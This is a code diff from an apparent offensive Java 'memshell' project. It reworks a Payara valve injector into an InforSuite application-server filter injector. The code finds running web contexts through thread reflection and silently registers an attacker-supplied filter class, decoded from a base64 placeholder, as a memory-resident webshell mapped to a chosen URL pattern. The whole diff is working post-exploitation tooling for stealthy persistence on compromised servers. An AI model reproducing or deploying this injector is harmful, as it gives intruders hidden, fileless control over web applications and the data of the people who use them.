@@ -1,52 +1,66 @@
-package com.reajason.javaweb.memshell.payara.injector;
+package com.reajason.javaweb.memshell.inforsuite.injector;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
-import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
+import java.util.logging.Logger;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
  */
-public class PayaraValveInjector {
+public class InforSuiteFilterInjector {
+    Logger log = Logger.getLogger(InforSuiteFilterInjector.class.getName());
 
     static {
-        new PayaraValveInjector();
+        new InforSuiteFilterInjector();
     }
 
-    public PayaraValveInjector() {
+    public InforSuiteFilterInjector() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
-                Object valve = getShell(context);
-                inject(context, valve);
+                Object filter = getShell(context);
+                inject(context, filter);
             }
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
     public String getClassName() {
         return "{{className}}";
     }
 
-    public String getBase64String() {
+    public String getBase64String() throws IOException {
         return "{{base64Str}}";
     }
 
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                Object context = getFieldValue(getFieldValue(thread, "target"), "this$0");
-                if (context != null && "com.sun.enterprise.web.WebModule".equals(context.getClass().getName())) {
-                    contexts.add(context);
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                for (Object key : childrenMap.keySet()) {
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(childrenMap.get(key), "children");
+                    for (Object key1 : children.keySet()) {
+                        Object context = children.get(key1);
+                        if (context != null) {
+                            contexts.add(context);
+                        }
+                    }
                 }
             }
         }
@@ -72,31 +86,38 @@ public class PayaraValveInjector {
         return obj;
     }
 
-    @SuppressWarnings("all")
-    public void inject(Object context, Object valve) throws Exception {
-        Object pipeline = invokeMethod(context, "getPipeline", null, null);
-        if (isInjected(pipeline)) {
-            System.out.println("valve already injected");
+    @SuppressWarnings("unchecked")
+    public void inject(Object context, Object filter) throws Exception {
+        String filterName = getClassName();
+        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
+            log.warning("filter already exists");
             return;
         }
-        Class valveClass;
-        String valveClassName = "org.apache.catalina.Valve";
-        valveClass = context.getClass().getClassLoader().loadClass(valveClassName);
-        invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
-    }
-
-    @SuppressWarnings("all")
-    public boolean isInjected(Object pipeline) throws Exception {
-        Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", null, null);
-        List<Object> valvesList = Arrays.asList(valves);
-        for (Object valve : valvesList) {
-            if (valve.getClass().getName().contains(getClassName())) {
-                return true;
-            }
+        Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
+        Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+        invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
+        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
+        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+        invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
+        invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass(), boolean.class}, new Object[]{filterMap, false});
+        try {
+            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+        } catch (Exception e) {
+            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
         }
-        return false;
+        Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
+        constructors[0].setAccessible(true);
+        Object filterConfig = constructors[0].newInstance(context, filterDef);
+        HashMap<String, Object> filterConfigs = null;
+        try {
+            filterConfigs = (HashMap<String, Object>) getFieldValue(context, "filterConfigs");
+        } catch (Exception e) {
+            filterConfigs = (HashMap<String, Object>) getFieldValue(context, "iasFilterConfigs");
+        }
+        filterConfigs.put(filterName, filterConfig);
+        log.info("filter added successfully");
     }
-
 
     @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
@@ -136,23 +157,29 @@ public class PayaraValveInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
-        for (Class<?> clazz = obj.getClass();
-             clazz != Object.class;
-             clazz = clazz.getSuperclass()) {
-            try {
-                Field field = clazz.getDeclaredField(name);
-                field.setAccessible(true);
-                return field.get(obj);
-            } catch (NoSuchFieldException ignored) {
-
-            }
-        }
-        throw new NoSuchFieldException(name);
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        Field field = getField(obj, fieldName);
+        field.setAccessible(true);
+        return field.get(obj);
     }
 
     @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
+    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
+        Class<?> clazz = obj.getClass();
+        while (clazz != null) {
+            try {
+                Field field = clazz.getDeclaredField(fieldName);
+                field.setAccessible(true);
+                return field;
+            } catch (NoSuchFieldException e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        throw new NoSuchFieldException(fieldName);
+    }
+
+    @SuppressWarnings("all")
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
         try {
             Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
             Method method = null;
@@ -170,10 +197,9 @@ public class PayaraValveInjector {
             if (method == null) {
                 throw new NoSuchMethodException("Method not found: " + methodName);
             }
+
             method.setAccessible(true);
             return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (NoSuchMethodException e) {
-            throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
         }
